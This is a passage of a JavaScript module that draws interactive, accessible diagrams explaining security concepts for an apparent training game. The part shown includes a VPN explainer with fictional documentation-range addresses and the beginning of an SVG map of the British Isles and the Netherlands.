// "See it at work" explainers for the Agency desk: small interactive SVG diagrams that show a concept
// operating in the shift's own scenario, without leaving the shift or changing its state. The pure state
// helpers (vpnView, KINDS) are tested in tests/explainers.test.mjs; mount(el, kind) draws one.
// Reduced motion aware, keyboard and screen-reader friendly, fictional data only, no network.

const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const reduced = () => typeof matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches;

// The explainers this module can draw. Keep in step with mount()'s switch and the shift JSON `seeItAtWork.kind`.
export const KINDS = ["vpn", "idor", "cloud", "inbox-rule", "spray", "mfa-fatigue", "ddos", "cert", "chain", "zero-trust", "sqli", "xss", "hashing"];

// VPN full tunnel: the same employee, physically in the London office the whole time. With the VPN off the
// website sees her real public address; with it on, all her traffic leaves through the company's VPN exit, so
// the website sees that exit's address and country instead. Figures match shift-01 (CHG-2291 moved the exit
// from London to the Amsterdam data centre, so staff on the VPN now appear to be in the Netherlands).
export const VPN = {
  home: { place: "London office", note: "Her computer never moves." },
  off: { label: "VPN off", exit: "Her office broadband", ip: "198.51.100.23", country: "United Kingdom", cc: "GB",
    seen: "Signs in from the UK, as you'd expect." },
  on: { label: "VPN on (full tunnel)", exit: "Company VPN exit, Amsterdam", ip: "198.51.100.10", country: "Netherlands", cc: "NL",
    seen: "Signs in from the Netherlands, though she hasn't left her desk. Other staff on the VPN show the same Amsterdam exit." },
};
// Pure: the view for a given toggle state. on=false is the real location, on=true is the VPN exit.
export function vpnView(on) { return on ? VPN.on : VPN.off; }

export function mount(el, kind, opts = {}) {
  if (kind === "vpn") return mountVpn(el, opts);
  if (kind === "idor") return mountIdor(el, opts);
  if (kind === "cloud") return mountCloud(el, opts);
  if (kind === "inbox-rule") return mountInbox(el, opts);
  if (kind === "spray") return mountSpray(el, opts);
  if (kind === "mfa-fatigue") return mountMfa(el, opts);
  if (kind === "ddos") return mountDdos(el, opts);
  if (kind === "cert") return mountCert(el, opts);
  if (kind === "chain") return mountChain(el, opts);
  if (kind === "zero-trust") return mountZt(el, opts);
  if (kind === "sqli") return mountSqli(el, opts);
  if (kind === "xss") return mountXss(el, opts);
  if (kind === "hashing") return mountHash(el, opts);
  el.innerHTML = `<p class="muted">No explainer for "${esc(kind)}".</p>`;
  return null;
}

// The "See it at work" heading. Omitted (head:false) when the explainer sits under a section that already has a
// heading, such as a lesson's "See it" panel, so the heading isn't announced twice.
const xplHead = (title, show) => show === false ? "" : `<div class="xpl-head"><div class="eyebrow">See it at work</div><b>${esc(title)}</b></div>`;

// A shared chrome for the pick-one explainers: a title, a row of option chips, and the outcome area. The whole
// stage is one aria-live region, so both the body (the response card/facts) and the caption are announced on change.
function selector(el, { cls, title, options, render, foot = "", start, head = true }) {
  let cur = start || options[0].key;
  el.innerHTML = `<figure class="xpl ${cls}">
    ${xplHead(title, head)}
    <div class="row xpl-pick" role="group" aria-label="${esc(title)}">
      ${options.map(o => `<button type="button" class="chip xpl-opt" data-k="${esc(o.key)}" aria-pressed="${o.key === cur}">${esc(o.label)}</button>`).join("")}</div>
    <div class="xpl-stage" aria-live="polite"><div id="xpl-body"></div><p class="xpl-caption" id="xpl-cap"></p></div>
    <p class="muted xpl-foot">${esc(foot) || "Simplified and fictional: documentation data only, and a real system records more than this."}</p>
  </figure>`;
  const paint = () => { el.querySelectorAll(".xpl-opt").forEach(b => b.setAttribute("aria-pressed", String(b.dataset.k === cur))); render(cur, el); };
  paint();
  el.querySelectorAll(".xpl-opt").forEach(b => b.addEventListener("click", () => { cur = b.dataset.k; paint(); }));
  return { get value() { return cur; }, set: v => { cur = v; paint(); } };
}

// A shared chrome for the toggle explainers: a title, one toggle button, and the outcome area (an aria-live stage).
// render(on, root) fills the stage and caption; the SVG/markup is specific to each kind.
function toggle(el, { cls, title, stage, label, render, start = false, head = true }) {
  let on = !!start;
  el.innerHTML = `<figure class="xpl ${cls}">
    ${xplHead(title, head)}
    <div class="row xpl-toggle"><button type="button" class="btn" id="xpl-btn" aria-pressed="${on}"></button>
      <span class="muted xpl-state" id="xpl-state"></span></div>
    <div class="xpl-stage" aria-live="polite">${stage}<p class="xpl-caption" id="xpl-cap"></p></div>
    <p class="muted xpl-foot">Simplified and fictional: documentation data only, and a real system records more than this.</p>
  </figure>`;
  const btn = el.querySelector("#xpl-btn"), fig = el.querySelector("." + cls);
  const paint = () => {
    fig.classList.toggle("is-on", on);
    const l = label(on);
    btn.textContent = l.btn; btn.setAttribute("aria-pressed", String(on));
    el.querySelector("#xpl-state").textContent = l.state;
    render(on, el);
  };
  paint();
  btn.addEventListener("click", () => { on = !on; paint(); });
  return { get on() { return on; }, set: v => { on = !!v; paint(); } };
}
const respCard = (ok, status, body) => `<div class="xpl-resp ${ok ? "ok" : "no"}"><span class="xpl-status mono">${esc(status)}</span><span>${esc(body)}</span></div>`;

function mountVpn(el, opts = {}) {
  const t = toggle(el, {
    cls: "xpl-vpn", title: "How a VPN changes your sign-in location", start: opts.start, head: opts.head,
    foot: "Addresses are documentation ranges and the picture is simplified.",
    stage: `<svg viewBox="0 0 760 551" class="xpl-svg vpn-map" role="img" aria-hidden="true">
        <rect width="760" height="551" class="vpn-sea"/>
        <path class="vpn-land vpn-ie" d="M128.8 248.8 L123.9 252.3 L119.6 266.3 L107.5 268.7 L114.5 273.7 L99.9 281.3 L109.1 290.6 L109.8 294.7 L126.4 299.9 L131.8 294.0 L130.5 288.1 L136.0 283.9 L140.3 287.7 L143.2 295.1 L147.8 297.0 L148.1 303.8 L156.0 302.6 L156.7 300.1 L164.4 305.3 L156.5 305.1 L155.9 309.5 L160.2 313.2 L160.6 324.3 L165.3 329.8 L161.7 334.8 L165.8 339.8 L160.9 340.9 L164.7 344.2 L168.0 361.7 L163.7 369.3 L161.2 383.7 L156.3 394.5 L152.3 393.4 L155.0 397.4 L156.1 395.7 L156.9 402.4 L142.6 401.5 L143.9 398.9 L138.7 406.2 L139.6 403.7 L136.6 397.5 L138.0 403.3 L136.0 405.5 L133.2 403.7 L117.8 407.5 L117.0 409.6 L119.5 410.0 L118.1 413.4 L114.0 415.9 L110.0 414.0 L108.7 419.2 L104.7 422.3 L97.7 423.5 L99.5 418.6 L92.6 418.7 L96.0 422.0 L96.1 425.4 L90.3 430.1 L87.9 428.6 L89.8 429.3 L88.8 433.7 L81.7 431.9 L83.8 432.6 L83.6 435.5 L70.4 436.3 L67.2 440.3 L62.3 441.1 L64.2 437.8 L61.6 439.6 L60.3 436.5 L48.6 442.5 L48.1 440.3 L57.1 433.7 L47.7 437.0 L59.8 429.8 L56.7 425.7 L54.6 429.8 L38.1 435.2 L43.6 427.2 L56.0 419.5 L38.7 426.8 L35.6 420.9 L32.3 424.2 L30.6 419.1 L35.0 417.8 L33.4 415.4 L34.7 413.5 L50.5 404.8 L29.3 407.7 L28.6 403.3 L37.6 397.6 L37.8 400.4 L39.8 400.0 L41.1 396.4 L44.6 400.2 L51.1 399.6 L47.0 398.3 L48.1 392.9 L44.5 390.9 L54.4 387.6 L52.8 386.5 L53.9 382.4 L81.9 376.9 L75.4 375.8 L75.9 371.5 L65.2 381.3 L63.8 381.0 L65.5 378.7 L60.6 380.2 L56.0 377.3 L52.1 381.9 L44.9 383.1 L58.6 372.7 L63.1 363.0 L59.3 362.6 L65.7 351.6 L71.9 353.1 L70.2 350.9 L76.1 351.7 L77.4 347.6 L72.7 347.6 L75.9 345.5 L73.5 344.7 L58.2 347.2 L56.9 343.9 L55.1 346.8 L56.9 338.8 L49.0 343.3 L46.0 342.1 L49.2 337.0 L37.5 337.4 L42.6 333.7 L37.3 329.8 L52.4 327.5 L45.8 324.9 L45.8 318.7 L56.5 316.9 L54.8 315.8 L56.7 313.2 L44.7 312.4 L45.6 308.5 L49.6 310.5 L46.1 304.6 L48.1 300.0 L43.9 301.8 L45.8 299.7 L42.6 294.3 L39.3 300.9 L41.1 294.1 L39.4 293.4 L43.0 289.7 L46.7 291.9 L43.7 293.0 L45.8 295.1 L47.8 291.2 L50.3 292.3 L47.8 288.8 L49.6 287.9 L65.8 289.7 L69.8 298.2 L72.6 290.5 L89.4 294.9 L86.0 292.3 L90.7 291.2 L87.5 289.2 L89.2 288.5 L84.6 286.8 L90.8 280.6 L98.8 279.2 L96.9 278.0 L101.6 271.4 L91.1 275.8 L93.3 272.8 L84.4 272.9 L80.5 269.0 L85.5 264.9 L91.1 265.5 L88.8 263.9 L92.6 265.2 L87.9 262.3 L90.0 260.4 L95.2 261.5 L93.5 260.2 L94.8 257.7 L91.3 256.7 L93.9 255.3 L91.1 252.4 L95.4 250.7 L96.7 243.9 L100.5 245.9 L106.1 240.7 L105.2 243.2 L109.8 245.1 L109.5 241.0 L111.6 238.8 L111.1 242.1 L114.2 243.6 L114.6 247.2 L114.9 241.4 L112.0 240.8 L116.5 237.9 L120.1 246.3 L115.3 255.0 L122.3 249.5 L119.4 241.0 L120.2 237.0 L128.5 237.3 L124.6 231.9 L138.4 239.7 L128.8 248.8Z M44.1 308.5 L45.4 308.5 L44.3 312.4 L40.9 307.7 L34.7 307.0 L43.7 304.9 L44.1 308.5Z"/>
        <path class="vpn-land" d="M128.8 248.8 L134.9 249.9 L137.7 242.1 L144.2 243.0 L152.9 239.2 L164.6 241.2 L166.6 243.5 L165.8 248.6 L168.7 250.2 L168.2 253.5 L171.3 255.7 L174.0 262.1 L176.6 264.1 L174.1 260.8 L175.5 260.2 L177.4 263.6 L176.2 267.0 L171.2 270.0 L170.6 273.6 L175.6 269.6 L181.0 269.6 L185.4 281.3 L182.9 287.9 L181.0 284.5 L181.5 278.6 L177.0 275.1 L176.6 277.3 L179.4 278.4 L178.0 279.0 L179.4 282.4 L176.8 287.2 L180.9 285.5 L181.7 290.0 L178.5 293.7 L172.1 293.7 L171.1 300.4 L165.3 304.1 L156.7 300.1 L156.0 302.6 L148.1 303.8 L146.8 302.3 L147.8 297.0 L143.2 295.1 L140.2 291.2 L140.3 287.7 L136.0 283.9 L130.5 288.1 L130.0 290.3 L131.8 294.0 L128.8 295.4 L127.8 299.2 L127.3 297.2 L126.2 298.0 L126.9 299.9 L117.6 298.5 L114.6 295.3 L109.8 294.7 L109.1 290.6 L99.9 281.3 L114.5 273.7 L110.1 272.2 L107.5 268.7 L119.6 266.3 L123.9 252.3 L128.8 248.8Z M271.8 433.4 L265.8 437.2 L262.1 436.3 L256.0 442.2 L255.6 445.1 L244.5 445.1 L238.3 440.1 L235.1 433.1 L230.9 433.7 L230.9 436.3 L229.3 436.8 L221.1 436.7 L221.1 433.4 L227.3 432.2 L227.9 430.2 L220.3 430.2 L218.3 427.5 L220.5 427.1 L218.8 426.7 L218.8 424.2 L215.8 427.0 L210.0 427.2 L207.9 431.6 L203.2 431.9 L200.8 434.5 L195.2 430.1 L203.8 428.2 L202.7 425.6 L204.4 423.8 L201.0 424.9 L201.7 428.0 L193.2 429.5 L191.2 427.1 L195.5 424.8 L195.0 420.6 L189.2 420.2 L189.6 417.7 L195.2 415.1 L196.8 411.5 L203.9 412.1 L207.7 406.9 L214.5 405.5 L220.3 401.3 L226.7 393.4 L228.4 384.6 L231.8 383.5 L228.5 383.9 L226.2 380.6 L230.5 373.7 L228.6 374.3 L225.5 369.5 L227.7 363.4 L217.5 365.2 L214.0 370.7 L206.3 370.7 L211.5 363.3 L219.0 357.9 L219.5 353.4 L224.6 347.8 L235.4 344.0 L233.9 341.4 L242.6 344.0 L251.0 340.6 L258.6 346.9 L255.5 338.5 L259.5 336.2 L265.0 344.0 L270.7 340.6 L267.6 342.3 L263.7 340.7 L258.2 329.6 L264.5 320.1 L259.8 318.3 L259.6 311.0 L265.8 307.7 L266.6 305.1 L263.9 304.2 L267.7 299.3 L265.9 295.6 L267.7 292.7 L263.2 297.7 L259.8 294.1 L256.8 302.6 L253.8 300.0 L254.9 291.9 L254.1 295.2 L251.8 295.7 L248.6 291.1 L248.4 287.7 L241.6 278.6 L249.2 258.8 L253.4 257.9 L251.4 256.8 L252.7 255.5 L257.5 256.1 L260.7 253.8 L243.5 252.8 L243.2 258.7 L236.0 260.3 L235.9 258.6 L234.6 260.8 L235.6 261.9 L229.8 264.9 L228.1 261.5 L226.3 264.7 L223.6 261.8 L223.9 259.7 L221.7 261.1 L217.6 257.5 L217.1 260.8 L219.4 263.5 L218.2 269.6 L203.3 259.7 L200.4 263.0 L203.3 272.1 L200.4 270.7 L200.4 267.0 L194.0 259.0 L193.6 252.1 L195.4 250.8 L197.0 256.2 L199.1 256.8 L197.4 251.1 L198.7 245.0 L203.1 240.6 L204.2 234.8 L210.9 226.0 L208.7 223.4 L208.5 220.2 L201.4 214.6 L203.3 212.1 L202.5 203.4 L205.2 201.3 L215.1 202.9 L209.1 201.1 L204.4 194.9 L205.8 199.5 L203.6 199.7 L203.1 195.5 L206.6 188.0 L203.6 193.0 L201.4 190.1 L202.3 199.6 L200.4 199.2 L201.6 201.1 L199.5 206.0 L197.6 205.2 L195.1 198.5 L196.2 204.3 L193.3 200.7 L191.4 204.8 L192.7 208.1 L189.7 206.9 L188.4 199.2 L201.4 184.2 L196.9 186.8 L187.4 198.6 L185.1 197.6 L184.8 201.4 L189.0 210.7 L183.7 218.1 L184.8 220.9 L180.7 229.7 L182.6 233.4 L179.7 236.1 L174.5 235.8 L174.3 231.2 L176.6 228.6 L177.7 216.5 L184.8 207.3 L180.2 211.7 L178.3 209.9 L177.9 207.3 L181.1 202.6 L178.0 205.1 L177.2 203.6 L181.1 197.1 L176.9 202.1 L180.9 193.9 L182.4 194.4 L181.5 192.1 L183.0 189.0 L180.0 191.6 L183.6 185.1 L180.5 185.7 L181.1 181.5 L185.0 179.8 L182.2 179.8 L184.7 175.5 L192.4 175.2 L196.9 168.8 L192.7 174.4 L187.2 174.5 L186.1 172.1 L184.3 173.6 L185.6 170.3 L187.8 171.3 L191.4 168.8 L186.0 169.9 L189.0 163.7 L199.1 160.8 L191.5 160.7 L195.2 155.3 L177.9 172.5 L174.9 170.3 L175.6 168.5 L172.3 169.6 L167.5 164.7 L172.8 165.6 L171.9 163.7 L175.2 161.6 L182.0 161.9 L162.7 162.8 L160.4 160.1 L175.3 157.1 L172.4 154.7 L178.3 152.4 L170.2 151.3 L172.4 150.9 L171.5 149.8 L173.0 145.8 L182.6 145.4 L179.3 146.0 L174.7 141.5 L178.8 138.7 L186.5 139.9 L177.7 137.2 L180.9 131.3 L186.2 133.3 L183.3 130.8 L185.2 128.5 L180.9 130.8 L176.2 129.7 L185.0 123.1 L181.4 126.2 L179.0 125.6 L179.6 123.3 L173.7 126.6 L173.6 122.0 L171.7 119.2 L172.8 114.6 L179.0 118.3 L183.0 116.6 L178.3 116.5 L173.8 111.2 L174.3 108.4 L177.9 107.7 L173.9 105.8 L173.6 101.1 L177.2 99.1 L180.0 104.4 L180.7 101.1 L178.6 97.8 L179.8 95.9 L183.8 99.8 L186.0 97.0 L192.0 100.3 L186.7 96.5 L187.5 95.2 L196.7 101.1 L192.0 96.3 L192.6 94.3 L185.6 90.5 L185.0 87.6 L189.6 88.4 L189.7 84.9 L191.4 84.2 L186.7 78.2 L194.9 77.6 L201.0 80.2 L199.5 78.7 L201.2 78.0 L197.4 78.2 L193.5 73.2 L194.5 70.0 L198.4 71.4 L195.9 70.0 L197.4 67.9 L199.1 68.8 L195.7 65.1 L198.1 63.0 L199.3 58.5 L204.1 59.8 L204.6 64.1 L205.9 59.7 L209.6 62.4 L206.4 68.2 L211.9 61.4 L216.8 62.9 L214.7 68.1 L219.4 63.3 L222.8 64.1 L229.2 60.3 L233.4 61.9 L242.7 58.6 L250.0 60.0 L248.5 57.1 L249.6 55.9 L260.7 57.9 L257.3 64.7 L259.7 67.2 L257.3 72.4 L230.1 95.6 L227.5 94.1 L230.5 97.0 L229.9 99.2 L220.8 99.5 L217.9 97.0 L220.5 100.1 L228.9 101.9 L230.7 100.6 L232.8 102.4 L237.0 99.9 L230.5 108.4 L228.8 106.2 L220.9 109.2 L216.8 114.7 L223.8 109.5 L229.9 108.8 L226.9 114.6 L222.0 116.1 L223.7 116.8 L222.4 119.0 L229.1 115.8 L227.5 114.3 L242.9 111.3 L242.3 109.9 L248.6 106.9 L260.3 109.9 L264.0 108.0 L279.0 109.9 L292.6 108.0 L297.9 112.8 L300.0 120.3 L293.2 128.5 L290.4 136.3 L291.0 139.2 L286.7 146.4 L286.7 150.2 L279.2 158.9 L276.5 167.4 L269.8 174.0 L259.5 174.9 L251.3 179.5 L254.1 180.0 L264.9 174.6 L267.5 176.2 L266.4 179.5 L267.5 180.6 L274.5 184.2 L268.1 188.8 L262.5 188.1 L256.2 195.6 L250.7 197.6 L240.4 196.3 L235.2 193.4 L240.9 198.5 L258.9 201.9 L263.2 200.7 L266.9 195.9 L272.7 196.0 L274.3 198.9 L288.2 203.6 L298.3 218.7 L304.1 221.2 L307.6 244.1 L312.4 254.4 L315.1 266.0 L318.4 268.5 L317.4 272.5 L319.4 271.4 L337.4 280.5 L343.4 292.7 L352.6 300.0 L348.1 304.8 L350.2 311.4 L359.1 325.1 L359.0 328.8 L358.7 326.4 L352.1 325.7 L346.8 320.1 L332.3 322.0 L346.2 321.6 L349.1 326.3 L361.8 337.0 L366.1 351.7 L365.2 354.8 L355.3 365.5 L358.2 365.4 L362.6 370.4 L366.9 371.8 L370.1 363.0 L372.7 361.1 L394.7 363.2 L406.2 371.4 L409.4 379.5 L410.2 386.9 L405.8 398.5 L404.3 408.6 L400.9 409.9 L396.5 416.1 L391.1 411.4 L394.7 415.0 L388.3 415.4 L394.9 415.8 L392.4 419.5 L395.1 419.2 L394.8 421.2 L388.2 424.9 L385.5 421.3 L382.2 426.4 L376.7 427.9 L378.7 429.3 L384.0 426.6 L383.8 434.9 L379.0 438.1 L369.2 439.3 L366.9 442.2 L376.6 440.9 L377.5 442.5 L372.2 444.3 L377.2 445.8 L377.6 444.0 L378.8 446.9 L385.4 447.7 L400.1 445.9 L397.9 448.9 L399.0 454.5 L398.1 458.3 L388.2 462.9 L385.1 467.3 L385.5 470.8 L378.7 470.1 L374.4 473.9 L366.3 476.1 L363.4 479.9 L346.5 475.4 L331.3 478.3 L330.3 480.8 L326.7 478.6 L328.0 476.6 L325.6 474.8 L323.1 474.7 L321.2 478.1 L321.6 474.7 L318.6 474.7 L319.9 476.1 L319.0 478.1 L309.2 470.8 L313.8 477.1 L307.4 479.2 L306.2 481.4 L302.1 480.3 L294.4 482.9 L291.3 480.3 L290.0 482.5 L294.0 483.7 L293.6 487.6 L280.1 485.3 L278.2 487.4 L278.4 491.6 L277.5 488.3 L265.6 480.6 L253.2 483.8 L249.9 486.8 L246.9 483.6 L247.8 487.2 L245.6 492.0 L246.1 495.3 L244.0 496.7 L246.1 498.2 L241.6 503.1 L240.7 508.0 L236.7 508.5 L231.4 502.6 L228.4 503.8 L226.9 500.0 L224.8 499.4 L225.2 495.3 L223.9 495.3 L223.0 498.6 L221.1 498.6 L224.1 499.7 L223.0 500.0 L224.5 500.8 L224.1 502.6 L219.6 500.0 L214.7 502.3 L208.5 501.5 L206.3 502.6 L205.2 507.6 L200.6 509.2 L198.9 512.1 L197.3 509.4 L197.6 512.1 L195.0 514.7 L197.2 516.6 L193.0 522.0 L189.5 515.5 L184.1 512.9 L181.4 516.7 L176.9 517.0 L177.6 511.2 L189.1 506.3 L194.3 501.1 L194.2 498.5 L197.4 496.9 L198.5 491.1 L200.6 489.8 L201.0 492.0 L203.8 492.4 L201.4 488.3 L205.4 488.0 L206.7 484.0 L212.1 478.4 L213.7 465.6 L219.6 466.6 L223.7 462.3 L222.2 458.3 L223.4 458.3 L223.0 456.1 L237.3 453.1 L249.3 456.4 L260.4 454.6 L260.7 456.1 L260.7 449.1 L262.1 445.8 L270.8 439.0 L280.6 425.0 L271.8 433.4Z M321.2 481.7 L321.8 483.2 L318.9 485.0 L318.5 487.6 L315.0 488.7 L308.6 484.1 L306.0 484.7 L313.8 478.6 L321.2 481.7Z M383.4 444.3 L384.1 446.5 L379.7 446.6 L377.8 444.3 L378.9 442.4 L383.4 444.3Z M212.1 344.9 L212.6 346.5 L208.5 342.9 L210.6 342.3 L212.1 344.9Z M227.1 342.9 L228.8 343.3 L223.2 349.7 L217.5 352.5 L218.1 349.7 L214.7 349.8 L212.3 344.7 L212.3 338.5 L220.0 337.0 L223.8 343.5 L227.1 342.9Z M160.4 235.9 L162.4 236.8 L161.7 238.5 L158.9 236.6 L160.4 235.9Z M196.7 225.3 L195.3 229.0 L189.4 227.8 L188.2 226.7 L186.7 218.0 L189.7 213.9 L192.8 214.9 L196.0 222.2 L195.2 224.5 L196.7 225.3Z M198.0 212.5 L198.4 213.9 L195.3 210.6 L192.7 203.8 L196.4 205.5 L198.0 212.5Z M166.8 213.5 L165.9 217.2 L158.8 221.6 L157.8 218.9 L160.2 217.2 L157.6 214.3 L160.0 211.0 L157.5 210.7 L152.0 216.1 L153.9 207.1 L157.4 204.9 L158.0 208.8 L158.5 206.2 L163.4 202.2 L164.7 209.7 L166.8 213.5Z M161.3 193.6 L163.6 193.0 L162.3 196.7 L159.3 197.1 L161.3 193.6Z M174.1 193.0 L176.6 190.9 L177.5 192.4 L168.9 209.5 L165.8 209.2 L165.4 203.6 L171.3 200.3 L167.9 199.8 L174.1 193.0Z M142.2 170.3 L145.0 170.7 L140.2 175.3 L136.9 172.1 L142.2 170.3Z M177.5 175.8 L178.4 177.7 L175.8 176.9 L174.5 179.5 L177.0 179.6 L173.7 182.0 L171.5 181.7 L171.7 179.9 L159.4 185.0 L156.3 181.8 L158.1 180.5 L160.0 182.4 L167.1 178.6 L161.4 178.7 L163.8 175.1 L167.4 174.0 L167.2 172.1 L163.8 173.7 L157.2 169.5 L158.7 168.5 L157.6 166.7 L163.0 164.2 L165.9 164.8 L168.9 170.9 L174.2 171.4 L178.7 175.1 L177.5 175.8Z M153.4 162.8 L148.5 168.3 L145.9 167.8 L153.4 162.8Z M124.3 145.1 L124.9 146.5 L122.7 148.4 L119.2 148.1 L122.5 142.5 L124.3 145.1Z M157.6 142.5 L160.2 145.1 L159.1 148.1 L157.1 148.7 L153.5 145.4 L157.6 142.5Z M128.9 128.2 L130.5 129.3 L128.5 132.9 L125.5 132.6 L128.1 134.0 L128.4 137.1 L125.8 137.7 L129.8 139.5 L125.5 140.3 L122.3 132.9 L124.4 128.9 L123.2 124.9 L125.5 123.8 L129.6 127.4 L124.3 125.2 L125.0 126.6 L128.9 128.2Z M128.3 119.8 L130.2 120.9 L128.3 121.6 L130.1 123.2 L123.8 121.8 L125.0 119.4 L128.3 119.8Z M165.7 127.1 L165.6 122.3 L168.0 118.5 L168.1 127.0 L165.7 127.1Z M132.5 110.7 L134.5 111.7 L129.8 111.7 L133.2 113.9 L132.6 115.1 L126.8 116.1 L132.1 116.3 L131.6 118.3 L127.0 118.3 L125.8 116.5 L126.6 116.1 L119.6 113.9 L121.7 110.2 L124.5 110.2 L124.2 111.6 L126.8 108.8 L126.2 110.2 L130.9 108.8 L130.7 110.6 L132.5 110.7Z M150.2 127.1 L146.0 126.1 L143.3 121.2 L145.2 121.2 L144.4 119.5 L145.4 118.1 L148.8 121.9 L148.1 118.8 L150.2 118.7 L147.3 116.1 L147.8 113.1 L154.6 117.9 L153.9 119.5 L155.3 117.7 L158.0 120.9 L154.8 111.1 L158.0 108.0 L162.9 114.1 L163.6 120.1 L161.9 124.5 L163.8 123.8 L164.7 127.8 L162.9 129.3 L166.3 129.1 L165.3 130.8 L170.8 132.6 L178.8 131.5 L177.4 135.5 L167.5 144.1 L168.2 139.3 L172.6 135.5 L168.2 136.3 L166.4 133.3 L167.0 135.1 L165.0 138.8 L162.6 134.8 L157.8 137.0 L159.1 134.8 L157.0 135.5 L155.9 133.7 L157.0 132.6 L152.7 128.9 L157.6 128.9 L153.3 127.1 L152.9 124.2 L151.4 125.2 L151.2 123.4 L150.2 127.1Z M140.5 80.5 L140.3 78.4 L143.1 80.9 L140.5 80.5Z M138.0 105.8 L132.6 100.9 L134.1 102.2 L139.2 99.2 L137.7 97.8 L141.8 97.4 L140.7 96.3 L141.6 95.6 L133.0 92.7 L138.6 89.3 L134.7 90.1 L135.8 87.9 L134.2 88.8 L133.0 86.8 L133.0 82.4 L136.0 82.0 L134.7 80.7 L135.6 79.1 L139.4 80.5 L138.5 80.9 L140.9 86.4 L140.6 82.0 L145.6 82.0 L142.2 76.9 L160.8 65.4 L162.5 69.7 L161.0 72.5 L162.5 73.6 L156.3 79.5 L159.3 80.6 L163.0 78.3 L162.8 80.5 L160.5 82.3 L155.3 80.9 L156.1 84.6 L148.4 87.5 L155.0 86.4 L156.3 89.0 L155.3 89.7 L156.8 90.1 L150.7 91.2 L153.5 93.4 L151.0 96.3 L148.1 94.4 L148.4 96.7 L147.1 95.9 L145.6 91.9 L149.3 89.0 L146.3 89.0 L143.9 91.9 L147.1 98.5 L143.2 97.5 L144.6 101.1 L141.1 101.1 L140.5 104.0 L138.0 105.8Z M262.8 47.2 L265.0 47.6 L263.2 53.1 L260.9 48.7 L262.4 48.3 L260.2 48.3 L262.8 47.2Z M253.6 49.8 L257.2 49.0 L252.0 50.5 L247.8 44.8 L250.4 42.5 L253.7 44.2 L256.0 48.3 L253.6 49.8Z M269.8 40.2 L270.5 42.3 L266.8 45.0 L261.9 40.8 L255.0 43.2 L254.2 36.6 L252.3 41.3 L249.9 37.8 L251.2 31.9 L255.6 30.8 L261.5 34.8 L257.7 38.8 L268.2 39.2 L266.4 41.3 L267.7 42.6 L269.8 40.2Z M275.6 32.2 L276.5 33.7 L271.1 33.9 L273.3 31.8 L271.8 30.4 L275.6 32.2Z M261.2 31.8 L257.6 29.2 L262.8 28.9 L261.2 31.8Z M266.6 28.1 L268.8 25.2 L269.6 30.7 L266.6 28.1Z M278.6 23.0 L279.7 21.6 L280.3 23.4 L270.9 28.4 L274.0 24.5 L273.5 23.0 L278.6 23.0Z M259.8 21.6 L258.9 20.8 L262.4 19.4 L261.7 21.6 L266.6 25.2 L264.9 26.4 L265.4 24.9 L261.1 24.2 L259.8 21.6Z"/>
        <path class="vpn-land" d="M579.4 346.4 L578.7 352.1 L579.3 359.6 L575.3 368.9 L574.5 378.3 L573.9 379.4 L565.1 379.0 L564.0 379.8 L564.1 381.7 L565.3 383.0 L563.1 384.0 L564.4 388.2 L570.2 389.8 L572.5 388.8 L574.8 393.4 L573.7 397.7 L574.1 400.6 L568.0 406.9 L565.5 407.4 L563.1 410.2 L566.4 412.8 L567.4 415.0 L564.5 418.3 L561.7 418.4 L556.6 421.0 L553.9 420.4 L554.1 422.1 L552.9 422.5 L550.4 420.1 L546.1 418.4 L545.0 419.0 L547.0 421.4 L544.7 420.7 L540.0 422.8 L541.0 424.9 L540.2 427.2 L542.5 428.1 L542.4 430.0 L545.2 431.9 L544.8 434.5 L548.2 439.1 L548.5 441.9 L548.2 448.0 L543.9 455.1 L544.0 457.2 L547.0 456.8 L546.1 457.6 L546.7 458.2 L541.6 462.4 L540.2 464.7 L537.5 464.1 L538.2 468.2 L542.2 467.8 L542.1 470.2 L544.1 471.3 L543.9 474.3 L542.4 474.9 L542.1 477.0 L541.1 477.4 L542.0 479.7 L535.7 479.6 L534.4 478.5 L533.0 479.5 L532.4 479.2 L532.8 477.3 L530.4 475.4 L530.3 474.3 L534.8 468.5 L533.5 468.5 L535.2 465.1 L535.0 463.3 L535.8 463.1 L536.0 461.2 L537.3 460.8 L536.6 460.0 L536.8 458.0 L528.7 455.3 L526.3 451.1 L523.1 452.5 L517.6 452.5 L517.1 449.9 L514.8 449.6 L513.1 446.4 L513.4 442.9 L511.8 440.9 L508.1 445.4 L503.5 444.3 L505.4 444.3 L505.4 440.9 L504.0 439.9 L499.4 444.0 L496.6 443.9 L496.0 443.5 L496.1 440.9 L494.8 441.0 L491.5 442.7 L492.7 446.4 L492.0 447.6 L487.9 446.6 L487.0 444.0 L483.2 444.6 L479.7 442.2 L478.4 442.0 L476.7 444.7 L474.3 445.5 L470.0 442.1 L465.2 441.8 L462.6 438.1 L462.8 436.7 L466.0 434.6 L475.1 433.7 L476.8 435.9 L475.7 437.0 L480.2 438.0 L483.0 442.5 L488.6 442.4 L489.0 441.2 L488.1 439.2 L482.6 437.8 L479.4 434.8 L481.8 433.7 L486.2 434.8 L485.7 433.4 L483.3 432.2 L483.2 430.5 L485.2 429.7 L482.0 428.0 L480.8 424.4 L479.1 423.1 L475.7 424.2 L475.4 422.7 L478.6 421.1 L482.1 421.3 L480.7 419.2 L481.1 417.8 L480.2 413.6 L484.2 412.6 L488.6 406.9 L495.6 394.9 L498.4 385.8 L500.6 370.3 L503.0 361.2 L505.2 361.2 L505.0 363.2 L507.0 364.6 L513.4 361.9 L520.7 355.0 L522.8 354.2 L524.9 347.6 L529.4 343.3 L541.5 337.7 L551.8 338.1 L557.5 336.0 L568.0 335.4 L569.2 336.2 L570.2 340.6 L573.9 343.1 L576.0 342.9 L575.8 345.2 L579.4 346.4Z M459.4 446.3 L465.4 444.1 L474.5 448.0 L478.3 446.5 L479.2 444.4 L483.5 447.2 L486.6 446.7 L486.2 448.7 L483.4 451.8 L478.2 455.1 L473.8 455.4 L472.7 452.8 L467.5 450.8 L464.6 451.4 L464.2 453.5 L460.7 453.2 L459.5 450.9 L459.4 446.3Z M480.9 429.7 L482.8 431.4 L478.5 433.0 L473.8 429.0 L472.4 430.1 L470.0 429.3 L470.0 427.6 L473.9 426.4 L478.5 426.9 L480.9 429.7Z M507.6 353.5 L508.2 353.8 L507.6 355.4 L504.5 359.4 L502.4 359.3 L501.8 357.9 L502.6 354.9 L506.4 349.4 L507.5 349.8 L508.1 352.3 L507.6 353.5Z M507.1 